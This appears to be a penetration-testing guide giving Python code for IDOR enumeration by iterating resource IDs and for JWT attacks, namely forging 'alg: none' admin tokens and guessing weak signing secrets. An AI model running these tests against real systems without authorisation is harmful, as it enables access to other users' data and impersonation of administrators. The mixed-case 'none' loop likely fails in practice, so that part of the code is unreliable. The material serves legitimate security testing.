# Deep Technical Procedures

## IDOR Testing Automation

```python
import requests
import json

class IDORTester:
    def __init__(self, base_url, auth_token):
        self.base = base_url
        self.session = requests.Session()
        self.session.headers['Authorization'] = f'Bearer {auth_token}'

    def test_endpoint(self, endpoint_pattern, start_id=1, end_id=100):
        """Test for IDOR by iterating through resource IDs"""
        results = []
        for resource_id in range(start_id, end_id + 1):
            url = f"{self.base}{endpoint_pattern}/{resource_id}"
            resp = self.session.get(url)
            if resp.status_code == 200:
                results.append({
                    'url': url,
                    'id': resource_id,
                    'status': 200,
                    'data': resp.text[:200]
                })
        return results
```

## JWT Security Testing

```python
import jwt
import requests

def test_jwt_security(api_url, token, endpoint):
    tests = []
    
    # Test algorithm confusion (alg: none)
    for alg in ['none', 'None', 'NONE', 'nOnE']:
        forged = jwt.encode({'sub': 'admin'}, '', algorithm=alg)
        resp = requests.get(f"{api_url}{endpoint}",
                          headers={'Authorization': f'Bearer {forged}'})
        if resp.status_code == 200:
            tests.append({
                'vulnerability': 'JWT None Algorithm Attack',
                'algorithm': alg,
                'status': resp.status_code
            })

    # Test weak secret
    common_secrets = ['secret', 'password', '12345', 'jwt_secret', 'key']
    original = jwt.decode(token, options={"verify_signature": False})
    for secret in common_secrets:
        try:
            jwt.decode(token, secret, algorithms=['HS256'])
            tests.append({
                'vulnerability': 'JWT Weak Secret Cracked',
                'secret': secret
            })
            break
        except:
            pass
    
    return tests
```
